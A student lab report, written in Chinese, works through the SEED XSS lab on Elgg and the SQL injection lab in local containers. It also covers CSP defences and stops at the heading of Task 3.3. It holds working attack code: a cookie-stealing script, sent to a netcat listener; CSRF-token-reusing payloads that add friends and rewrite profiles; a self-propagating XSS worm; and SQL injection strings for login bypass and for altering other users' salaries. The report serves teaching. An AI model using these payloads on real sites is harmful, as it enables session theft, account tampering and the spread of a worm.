### Web_XSS_Elgg

跨站脚本 (XSS ) 是网络应用程序中常见的一种漏洞。攻击者可利用该漏洞向受害者的网络浏览器注入恶意代码。利用这些恶意代码，攻击者可以窃取受害者的凭证。利用 XSS 漏洞可绕过浏览器为保护这些凭证而采用的访问控制策略。

------

#### Lab Environment Setup

本 lab 建立了几个网站，它们由容器 10.9.0.5 托管。我们需要将网络服务器的名称映射到该 IP 地址。请在 /etc/hosts 中添加以下条目。您需要使用 root 权限来修改此文件：

```shell
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32a.com
10.9.0.5 www.example32b.com
10.9.0.5 www.example32c.com
10.9.0.5 www.example60.com
10.9.0.5 www.example70.com
```

查看配置文件，seedlab 镜像已自动装好，只有 x 10.9.0.5 www.seed-server.com 需要自行填写。用 dcbuild 和 dcup 装好镜像。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260516143745303.png" alt="image-20260516143745303" style="zoom:50%;" />

可以登录进对应网站。

------

#### Task 1: Posting a Malicious Message to Display an Alert Window

此任务的目的是在 Elgg 配置文件 中嵌入 JavaScript 程序，这样当其他用户查看配置文件时，JavaScript 程序将被执行并显示一个警报窗口。下面的 JavaScript 程序将显示一个警报窗口：

```html
<script>alert(’XSS’);</script>
```

如果在个人档案中嵌入上述 JavaScript 代码，那么任何查看个人档案的用户都会看到提示窗口。

在这种情况下，JavaScript 代码足够短，可以输入到简短描述字段中。如果想运行较长的 JavaScript，但又受限于在表单中键入的字符数，可以将 JavaScript 程序存储在一个独立文件中，以 .js 扩展名保存，然后使用
根据 pdf 给出的账号，登录 Samy 账号，在 profile 中修改内容如下：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260516154819870.png" alt="image-20260516154819870" style="zoom:50%;" />

访问 samy 的主页，可以看到有提示内容跳出：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260516162454992.png" alt="image-20260516162454992" style="zoom:50%;" />



------

#### Task 2: Posting a Malicious Message to Display Cookies

利用以下代码可以实现显示访问的 cookie：

```html
<script>alert(document.cookie);</script>
```

更改后内容如下：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260516165321301.png" alt="image-20260516165321301" style="zoom:50%;" />



------

#### Task 3: Stealing Cookies from the Victim’s Machine

在上一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookie，但只有用户可以看到 cookie，攻击者看不到。在本任务中，攻击者希望 JavaScript 代码将 cookie 发送给自己。为此，恶意 JavaScript 代码需要向攻击者发送 HTTP 请求，并在请求中附加 Cookie。

可以让恶意 JavaScript 插入 标签，并将其 src 属性设置为攻击者的机器，从而实现这一目的。当 JavaScript 插入 img 标签时，浏览器会尝试从 src 字段中的 URL 加载图片；这样就会向攻击者的机器发送 HTTP GET 请求。下面给出的 JavaScript 会将 cookie 发送到攻击者机器（IP 地址为 10.9.0.1）的 5555 端口，攻击者的 TCP 服务器会监听同一端口。

```html
<script>
    document.write("<img src='http://127.0.0.1:5555?c=" + document.cookie + "'>")；</script>
```

攻击者常用的程序是 netcat（或 nc），如果使用“-l ”选项运行，它就会成为一个 TCP 服务器，在指定端口上监听连接。该服务器程序基本上是将客户端发送的内容打印出来，并将运行服务器的用户输入的内容发送给客户端。键入下面的命令，监听 5555 端口：

```shell
 $ nc-lknv 5555
```

按照要求对 5555 端口进行监听，访问 Samy 的主页，监听到的结果如下，看出来是给攻击者发送的 cookie：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260517133921835.png" alt="image-20260517133921835" style="zoom:50%;" />



------

#### Task 4: Becoming the Victim’s Friend

将编写一个 XSS 蠕虫，访问 Samy 页面的任何其他用户会添加为 Samy 的好友。这项任务需要编写一个恶意 JavaScript 程序，在没有攻击者干预的情况下，直接从受害者的浏览器伪造 HTTP 请求。攻击的目的是将 Samy 添加为受害者的好友。要为受害者添加好友，首先要弄清楚合法用户如何在 Elgg 中添加好友。更具体地说需要找出用户添加好友时发送到服务器的内容。Firefox 的 HTTP 检查工具可以帮助我们获取信息。它可以显示从浏览器发送的任何 HTTP 请求信息的内容。了解添加好友 HTTP 请求的外观后，就可以编写 JavaScript 程序来发送相同的 HTTP 请求。

```html
 <script type="text/javascript">
 	window.onload = function () {
 	var Ajax=null;
	 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	 var token="&__elgg_token="+elgg.security.token.__elgg_token; 
	//Construct the HTTP request to add Samy as a friend.
 	var sendurl=...; //FILL IN
	//Create and send Ajax request to add friend
 	Ajax=new XMLHttpRequest();
 	Ajax.open("GET", sendurl, true);
 	Ajax.send();
	}
 </script>
```

上述代码应放在 Samy 个人资料页面的 “About me ”字段中。该字段提供两种编辑模式： 编辑器模式（默认）和文本模式。编辑器模式会在输入的文本中添加额外的 HTML 代码，而文本模式不会。由于不希望在攻击代码中添加任何额外代码，因此在输入上述 JavaScript 代码之前，应启用文本模式。这可以通过点击 “About me ”文本字段右上角的 “编辑 HTML ”来实现。

先登录Boby账号添加 Samy 为好友，操作后使用 HTTP Header Live 抓取信息，得到结果如下：

```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1778997667&__elgg_token=SzlG3ocEHPHfrDVh9fzRYw&__elgg_ts=1778997667&__elgg_token=SzlG3ocEHPHfrDVh9fzRYw

Host: www.seed-server.com

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

X-Requested-With: XMLHttpRequest

Connection: keep-alive

Referer: http://www.seed-server.com/profile/samy

Cookie: traffic_target=gd; caf_ipaddr=183.192.29.217; country=CN; city="Shanghai"; lander_type=parkweb; pvisitor=4025d4f3-1230-491c-95ca-35bbe240fb78; Elgg=ldrt7kgf5or80o7tfoetmki09j

GET: HTTP/1.1 200 OK
```

从中可以看出 Samy 的好友 id 是 59 ，根据以上数据完成注入代码：

```html
<script type="text/javascript">    
\window.onload = function () {    
var Ajax=null;     
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;     
var token="&__elgg_token="+elgg.security.token.__elgg_token;     \
//Construct the HTTP request to add Samy as a friend.    
var sendurl= "http://www.seed-server.com/action/friends/add?friend=59" + "ts" + "token"; //FILL IN    
//Create and send Ajax request to add friend    
Ajax=new XMLHttpRequest();    
Ajax.open("GET", sendurl, true);    
Ajax.send();    
} </script>
```

首先先删除加好的好友：s

![image-20260517143207923](C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260517143207923.png)

再访问 Samy 主页 ，发现访问后加上好友：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260517143004975.png" alt="image-20260517143004975" style="zoom:50%;" />

ts 和 token 其实就是防御 CSRF 攻击的秘密令牌，在请求时会被发送到服务端进行校验，校验通过请求才有效。这里我们模拟发送添加好友请求自然也要在请求中附带这些令牌值。因为脚本是在访问时运行的，所以可以自动得到受害者的 token 信息。



------

#### Task 5: Modifying the Victim’s Profile

这项任务的目的是在受害者访问 Samy 的网页时修改受害者的个人资料。具体来说，就是修改受害者的 “About me”字段。编写一个 XSS 蠕虫来完成任务。

与之前的任务类似，需要编写一个恶意 JavaScript 程序，在没有攻击者干预的情况下，直接从受害者的浏览器伪造 HTTP 请求。要修改个人资料，首先要找出合法用户是如何在 Elgg 中编辑或修改其个人资料的。更具体地说，需要弄清如何构造 HTTP POST 请求来修改用户配置文件。我们将使用 Firefox 的 HTTP in spection 工具。了解修改用户配置文件 HTTP POST 请求的结构后就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。提供一段 JavaScript 代码骨架，以帮助完成这项任务。

```html
 <scripttype="text/javascript">
window.onload=function(){
 	//JavaScriptcodetoaccessusername,userguid,TimeStamp__elgg_ts
 	//andSecurityToken__elgg_token
 	varuserName="&name="+elgg.session.user.name;
 	varguid="&guid="+elgg.session.user.guid;
 	varts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 	vartoken="&__elgg_token="+elgg.security.token.__elgg_token;
 	//Constructthecontentofyoururl.
 	varcontent=...; //FILLIN
 	varsamyGuid=...; //FILLIN
 	varsendurl=...; //FILLIN
 	if(elgg.session.user.guid!=samyGuid)
 	{
 	//CreateandsendAjaxrequesttomodifyprofile
 	varAjax=null;
 	Ajax=newXMLHttpRequest();
 	Ajax.open("POST",sendurl,true);
	Ajax.setRequestHeader("Content-Type",
 	"application/x-www-form-urlencoded");
 	Ajax.send(content);
 	}
 }
 </script>
```

首先对 profile 页面进行修改 ，同时用插件捕捉抓包，找到包含 About me 内容的部分。可以看到对应内容如下，地址为 http://www.seed-server.com/action/profile/edit ：

```html
Host: www.seed-server.com

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:145.0) Gecko/20100101 Firefox/145.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=----geckoformboundaryf445e432c13609d834a1e9099630114f

Content-Length: 2900

Origin: http://www.seed-server.com

Connection: keep-alive

Referer: http://www.seed-server.com/profile/samy/edit

Cookie: traffic_target=gd; caf_ipaddr=183.192.29.217; country=CN; city="Shanghai"; lander_type=parkweb; pvisitor=4025d4f3-1230-491c-95ca-35bbe240fb78; Elgg=sbdue7q3drspn5hpuj6sqgejbn

Upgrade-Insecure-Requests: 1

__elgg_token=gwsDvK_-tu450wqfdypGTg&__elgg_ts=1779020100&name=Samy&description=<p>otk</p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=59
```

请求方式为 POST ，POST请求的重要字段：

- name：说明被修改的用户是谁
- description：说明修改
- about me 内容
- accesslevel[description]：说明修改权限
- guid：修改人的编号

根据信息写出程序如下：

```javascript
<p><script type="text/javascript">
window.onload = function(){
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var description = "&description=" + encodeURIComponent("Hacked by XSS") + "&accesslevel[description]=2";
    var content = token + ts + userName + description + guid;
    
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    if(elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script></p>
```

var samyGuid = 59 是此前得到的预设的 ID，将 token、ts、userName、description 参数和 guid 拼接成一个字符串。为了通过防护依旧需要 token 和 ts，在 description 指定输入的内容。设置 guid 是为了防止自己访问自己 profile 时也触发攻击。sendurl 是 Elgg 框架中处理个人资料修改请求的服务器端点。当用户在前端点击 Save 按钮时，表单会 POST 到这个地址。 JavaScript 直接向这个地址发送 POST 请求，模拟了正常用户提交表单的行为。

被攻击前 About me 中没有内容：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260522142328428.png" alt="image-20260522142328428" style="zoom:50%;" />

被攻击后出现了预设内容：
<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260522142258557.png" alt="image-20260522142258557" style="zoom:50%;" />



------

#### Task 6: Writing a Self-Propagating XSS Worm

要成为真正的蠕虫病毒，恶意 JavaScript 程序必须能够自我传播。也就是说，每当一些人查看受感染的配置文件时，不仅他们的配置文件会被修改，蠕虫病毒也会传播到他们的配置文件中，进一步影响查看这些新感染配置文件的其他人。这样，查看受感染配置文件的人越多，蠕虫的传播速度就越快。能够实现这一目标的 JavaScript 代码被称为自传播跨站脚本蠕虫。在本任务中需要实现这样一种蠕虫，它不仅可以修改受害者的个人资料并将用户 “Samy ”添加为好友，还可以将蠕虫本身的副本添加到受害者的个人资料中，从而将受害者变成攻击者。

为了实现自我传播，当恶意 JavaScript 修改受害者的配置文件时，它应该将自己复制到受害者的配置文件中。有几种方法可以实现这一目的，我们将讨论两种常见的方法。

**Link方法** 如果使用 `<script>` 标记中的 src 属性来包含蠕虫，那么编写自传播蠕虫就会容易得多。任务 1 中讨论过 src 属性，下面给出一个例子。蠕虫可以简单地将下面的 `<script>` 标记复制到受害者的配置文件中，从而用相同的蠕虫感染配置文件。

```javascript
<script type="text/javascript" src="http://www.example.com/xss_worm.js">
 </script>
```

这种方式将脚本放在远端，在主页放入带src属性的script标签，这种方法简单，实现代码短。

根据此前的网站配置，查看配置文件 apache_csp.conf，以下代码段可以看出放置蠕虫文件的位置：

```conf
# Purpose: hosting Javascript files
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example70.com
</VirtualHost>
```

因为并没有对应文件夹所以创建一个，根据 task 5中的攻击代码修改一个蠕虫版本，放置在文件夹下， 对应访问的是 http://www.example60.com/：

```javascript
window.onload = function() {
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    
    var wormSelf = "<script type=\"text/javascript\" src=\"http://www.example60.com/worm.js\"></script>";
    var description = "&description=" + encodeURIComponent(wormSelf) + "&accesslevel[description]=2";
    
    var content = token + ts + userName + description + guid;
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
```

在 http://www.example60.com/ 上面 click 测试发现可以，但是实际上好像不能成功链接，而且本来虚拟机没有提供这个文件夹，并没有实现这个功能。

**DOM方法**: 如果整个 JavaScript 程序（即蠕虫）被嵌入到受感染的配置文件中，要将蠕虫传播到另一个配置文件，蠕虫代码可以使用 DOM API 从网页中获取自身的副本。下面是一个使用 DOM API 的示例。该代码获取自身的一个副本，并将其显示在一个警报窗口中：

```javascript
 <script id="worm">
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; 
	var jsCode = document.getElementById("worm").innerHTML;
 	var tailTag = "</" + "script>";
 	
 	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); 
	
	alert(jsCode);
 </script>
```

那么按照 link 方法里面的代码来就可以了，只要将链接的代码段放入 profile editor 里面就可以了。

```javascript
<script id="worm" type="text/javascript">
window.onload = function() {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "<" + "/script>";
    
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var visibleText = "<h1 style='color:red'>hacked by XSS</h1>";
    var description = "&description=" + encodeURIComponent(visibleText + headerTag + jsCode + tailTag) + "&accesslevel[description]=2";
    
    var content = token + ts + userName + description + guid;
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
```

其特点在于获得自身代码，并加入为写入内容，这样每次写入 profile 的时候都可以自我复制同样的内容，从而达到无限传播的目的。用 Boby 访问 Samy 的页面前还没有 profile 内容：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260522175357257.png" alt="image-20260522175357257" style="zoom:50%;" />

访问后变成了设置好的内容：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260522180145568.png" alt="image-20260522180145568" style="zoom:50%;" />

再用 Charlie 访问 Boby 的 profile ，可以看到也被传播模型篡改：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260522180632492.png" alt="image-20260522180632492" style="zoom:50%;" />



------

#### Task 7: Defeating XSS Attacks Using CSP

XSS 漏洞的根本问题在于 HTML 允许 JavaScript 代码与数据混合。因此，要解决这个根本问题，需要将代码与数据分离。在 HTML 页面中嵌入 JavaScript 代码有两种方式，一种是内联方式，另一种是链接方式。内联方式是将代码直接放在页面中，而链接方式是将代码放在外部文件中，再从页面内部链接它。内联方式是 XSS 漏洞的罪魁祸首，因为浏览器无法知道代码最初来自哪里：是来自可信的 Web 服务器，还是来自不可信的用户。在没有这种信息的情况下，浏览器无法判断哪段代码可以安全执行，哪段代码是危险的。链接方式为浏览器提供了一个非常重要的信息，即代码的来源。网站可以告诉浏览器哪些来源是可信的，这样浏览器就能知道哪段代码可以安全执行。虽然攻击者也可以使用链接方式在他们的输入中包含代码，但他们无法将代码放置在那些可信的位置上。网站告诉浏览器哪些代码来源是可信的，是通过一种称为内容安全策略（CSP）的安全机制实现的。该机制专门设计用于防御 XSS 和点击劫持攻击。它已经成为一种标准，如今大多数浏览器都支持。CSP 不仅限制 JavaScript 代码，它还限制其他页面内容，例如限制图片、音频和视频的来源，以及限制页面是否可以放置在 iframe 中。

实验设置略过，网页可以正常访问并看到内容。

完成以下任务并回答相关问题：

1. 描述并解释访问这些网站时的观察结果

   http://www.example32a.com/
   <img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529220116120.png" alt="image-20260529220116120" style="zoom:50%;" />

   所有都是OK

   http://www.example32b.com/

   <img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529220210162.png" alt="image-20260529220210162" style="zoom:50%;" />

   只有from self 和 from www.example70.com 是 OK，其他是Failed。

   http://www.example32c.com/

   <img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529220412931.png" alt="image-20260529220412931" style="zoom:50%;" />

   只有Inline: Nonce (111-111-111), From self, From www.example70.com 是 OK，其他是Failed。

2.点击这三个网站网页上的按钮，描述并解释你的观察结果。

32a 的按钮点击后出现弹窗，而32b和32c均没有出现。这是因为在 apache_csp.conf 配置文件中设置了内容安全策略（CSP），这些策略限制了可以执行脚本的来源。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529220558321.png" alt="image-20260529220558321" style="zoom:50%;" />

3.修改 example32b 上的服务器配置（修改 Apache 配置），使得 Area 5 和 Area 6 显示 OK。

在白名单中加入example60.com。

```conf
# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
             default-src 'self'; \
             script-src 'self' *.example70.com \ *.example60.com \
           "
</VirtualHost>
```

需要在容器内修改，使用 service apache2 restart 重启服务。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529224443403.png" alt="image-20260529224443403" style="zoom:50%;" />

可见实现，6 显示 OK：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529224603434.png" alt="image-20260529224603434" style="zoom:50%;" />

4.修改 example32c 上的服务器配置（修改 PHP 代码），使得 Area 1、2、4、5 和 6 都显示 OK。

查看配置文件phpindex.php 发现白名单中没有 example60.com 和 nonce-222-222-222。查找到在 /var/www/csp 目录下可以修改 phpindex.php，顺便重启服务：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529225148463.png" alt="image-20260529225148463" style="zoom:50%;" />

查看网页，要求完成：
<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260529225221473.png" alt="image-20260529225221473" style="zoom:50%;" />

5.请解释为什么 CSP 可以帮助防止跨站脚本攻击。

内容安全策略（CSP）通过设定一系列的限制，对网页可以加载的资源类型和来源进行了严格的规定，这包括但不限于JavaScript脚本、CSS样式表、图片等资源，以及它们可以被加载的URL。当一个网络应用实施了一套严格的CSP 策略后，即便是发现了XSS漏洞的攻击者，也将面临无法迫使用户的浏览器执行其注入的恶意脚本的困境。通常情况下，CSP仅允许执行那些附有正确一次性标识符的脚本，而这个标识符是随机生成的，攻击者几乎不可能预测到正确的值，因此也就无法成功地将恶意脚本注入到用户的浏览器中执行。这种机制极大地增强了网页的安全性，防止了恶意脚本的执行，从而有效抵御了跨站脚本攻击。本质上来说是一种白名单策略，因此可以实现识别和防护。

------

### SQL Injection 

SQL 注入是一种代码注入技术，利用的是网络应用程序与数据库服务器之间接口的漏洞。当用户输入的信息在发送到后端数据库服务器之前没有在网络应用程序中进行正确检查时，就会出现这种漏洞。许多网络应用程序从用户那里获取输入，然后使用这些输入构建 SQL 查询，以便从数据库中获取信息。网络应用程序还使用 SQL 查询将信息存储 到数据库中。这些都是开发网络应用程序的常见做法。如果不仔细构造 SQL 查询，就会出现 SQL 注入漏洞。SQL 注入是对网络应用程序最常见的攻击之一。

------

#### Lab Environment Setup

打开 /etc/hosts 查看是否建立正确的映射，可以看到设置正确。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530111553304.png" alt="image-20260530111553304" style="zoom:50%;" />

使用 dcbuild 和 dcup 来设置环境，过程中出现 error，

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530112117487.png" alt="image-20260530112117487" style="zoom:50%;" />

发现是因为有孤儿容器残留导致的，清除容器和数据库内容再重新配置即可。但发现打开是默认网页：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530112906616.png" alt="image-20260530112906616" style="zoom:50%;" />

照网络教程进行处理，修改 image_www/apache_sql_injection.conf  将 ServerName 换成已建立DNS定向映射的网站后保存，找到apache2的配置文件 etc/apache2/apache2.conf，在文件的最后加上 10.9.0.5。所有操作在容器内进行，重启服务，发现可以正常访问：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530114633177.png" alt="image-20260530114633177" style="zoom: 50%;" />

------

#### Task 1: Get Familiar with SQL Statements

进入装载 mysql 的docker，然后登录 root 账号，进入 mysql client。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530115948117.png" alt="image-20260530115948117" style="zoom:50%;" />

加载已存在的 sqllab_users 数据库，并查看该数据库中的表。

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530120108426.png" alt="image-20260530120108426" style="zoom:50%;" />

使用SQL语句打印 Alice的所有信息。

```shell
SELECT * FROM credential WHERE name = 'Alice';
```

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530125048886.png" alt="image-20260530125048886" style="zoom:50%;" />



------

#### Task 2: SQL Injection Attack on SELECT Statement

##### Task 2.1: SQL Injection Attack from webpage

SQL 注入本质上是一种技术，攻击者通过该技术可以执行自己构造的恶意 SQL 语句（通常称为恶意载荷）。通过恶意 SQL 语句，攻击者可以从受害数据库中窃取信息；更糟糕的是，他们甚至可能对数据库进行修改。本任务需要在不知道 admin 的密码的情况下，登录进该账号并查看。

PHP 代码 unsafe_home.php用于进行用户身份验证。以下代码片段展示了用户身份验证的方式。

```php
$input_uname = $_GET['username'];
$input_pwd = $_GET['Password'];
$hashed_pwd = sha1($input_pwd);

$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
        FROM credential
        WHERE name = '$input_uname' AND Password = '$hashed_pwd'";

$result = $conn->query($sql);
```

可以看出 WHERE name = '$input_uname' AND Password = '$hashed_pwd'"; 是核心验证部分，已知用户名为 admin 为了绕过 password 检验部分，可以在 usename input 里面加入 SQL 注释符 --，成为 admin' -- 这样输入之后会取消掉密码验证，同时保证格式正确，特别注意的是 -- 后面需要空格来表示语法正确，登录能够得到数据信息：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530135946932.png" alt="image-20260530135946932" style="zoom:50%;" />

##### Task 2.2: SQL Injection Attack from command line

重复 Task 2.1，但不使用网页。可以使用命令行工具，例如 curl，它可以发送 HTTP 请求。值得一提的是，如果要在 HTTP 请求中包含多个参数，需要将 URL 和参数放在一对单引号之间；否则，用于分隔参数的特殊字符会被 shell 程序解释，从而改变命令的含义。以下示例展示了如何向 Web 应用程序发送带有两个参数的 HTTP GET 请求：

```shell
$ curl 'www.seed-server.com/unsafe_home.php?username=alice&Password=11'
```

如果需要在用户名字段或密码字段中包含特殊字符，需要对它们进行适当的编码，否则它们可能会改变请求的含义。如果要在这些字段中包含单引号，应该使用 %27 代替；如果要包含空格，应该使用 %20 代替。在本任务中，使用 curl 发送请求时确实需要处理 HTTP 编码。

根据示例代码改变具体网页和 username，查找到 - 的编码是 %2D，因此修改后代码应该如下：

```shell
$ curl 'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27--%20&Password=11'
```

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530142348801.png" alt="image-20260530142348801" style="zoom:50%;" />

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530142439917.png" alt="image-20260530142439917" style="zoom:50%;" />

可以看到是对应信息内容，说明获取成功了，但是不太好看，因此把信息存放在文件里：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530142533516.png" alt="image-20260530142533516" style="zoom:50%;" />

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260530142551911.png" alt="image-20260530142551911" style="zoom:50%;" />

##### Task 2.3: Append a new SQL statement

在上述两个攻击中只能从数据库中窃取信息，如果能够利用登录页面中的相同漏洞来修改数据库，那就更好了。一种思路是利用 SQL 注入攻击将一条 SQL 语句变成两条，其中第二条是 UPDATE 或 DELETE 语句。在 SQL 中，分号用于分隔两条 SQL 语句。请尝试通过登录页面运行两条 SQL 语句。本次攻击中存在一个防御机制阻止你运行两条 SQL 语句，弄清楚这个防御机制是什么，并在实验报告中描述你的发现。

根据提示继续尝试在输入 username 的时候同时加入其他的语句来实现。比如加入下面语句：

```php
admin'; UPDATE credential SET salary = 1 WHERE name = 'Boby'; -- 
```

但返回的是 error 界面：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601152424201.png" alt="image-20260601152424201" style="zoom:50%;" />

根据题目防御机制和源代码的提示，可以看出程序使用的是 query() 函数运行输入的 sql 语句， 然而PHP 中 mysqli 扩展的 query（） 函数不允许在数据库服务器中运行多条语句，所以会执行失败。为解决该问题，把 query() 函数，换成能够执行多条语句的函数。进入docker，找到var/www/SQL_Injection/目录下的unsafe_home.php，在其中更改 query() 函数为 multi_query() 函数，即可输入两条语句：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601153352024.png" alt="image-20260601153352024" style="zoom:50%;" />

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601153418016.png" alt="image-20260601153418016" style="zoom:50%;" />

再次试图输入多条语句，但是发现输入之后，web 页面不会显示内容，查询之后发现因为 query() 和 multi_query() 的函数返回值不同，所以执行新的语句后，不会有信息显示在 webpage 上。因此要在 mysql 中直接查看数据库的值：
<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601154254715.png" alt="image-20260601154254715" style="zoom:50%;" />

可以看到 Boby 的 Salary 被改成 1，还把 Alice 修改为 AUSTIN。



------

#### Task 3: SQL Injection Attack on UPDATE Statement

如果 SQL 注入漏洞出现在 UPDATE 语句中，造成的损害会更加严重，因为攻击者可以利用该漏洞修改数据库。在员工管理应用程序中，有一个“编辑资料”页面，允许员工更新他们的个人资料信息，包括昵称、电子邮件、地址、电话号码和密码。要进入此页面，员工需要先登录。当员工通过“编辑资料”页面更新信息时，将执行以下 SQL UPDATE 查询。unsafe_edit_backend.php 文件中实现的 PHP 代码用于更新员工的个人资料信息。该 PHP 文件位于 /var/www/SQL_Injection 目录中。继续之前要修改 task2 的更改内容。

```php
$hashed_pwd = sha1($input_pwd); $sql = "UPDATE credential SET nickname=’$input_nickname’, email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’ WHERE ID=$id;";
$conn->query($sql);
```

##### Task 3.1: Modify your own salary.

如“编辑资料”页面所示，员工只能更新他们的昵称、电子邮件、地址、电话号码和密码；他们没有被授权更改工资。假设 Alice 是一名心怀不满的员工，老板 Boby 今年没有加薪。想通过利用“编辑资料”页面中的 SQL 注入漏洞来增加的工资，工资存储在名为 salary 的列中。观察题目所给代码，发现可以按照 TASK2 的思路，使用 ’ 使上一句闭合后嵌入语句。找一个注入点，填入 alice',Salary='2000000，保存后可以查看到 Salary 已经被修改：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601155737401.png" alt="image-20260601155737401" style="zoom:50%;" />

##### Task 3.2: Modify other people’ salary.

增加自己的工资后，alice 决定惩罚老板 Boby，想把他的工资降低到 1 美元。观察参考代码，发现定位用的 WHERE 语句无法直接修改，因为和登录输入的 id 有关，所以将后面的语句直接用 -- 注释掉 ，然后自己加入新的 WHERE 语句，看列表可以看出 Boby 的信息在第二位，因此填入 alice',Salary=1 WHERE ID=2-- ，登录 admin 查看结果，可以看到 Boby 的 Salary 被改成 1：

<img src="C:\Users\95441\AppData\Roaming\Typora\typora-user-images\image-20260601175453185.png" alt="image-20260601175453185" style="zoom:50%;" />

##### Task 3.3: Modify other people’ password.

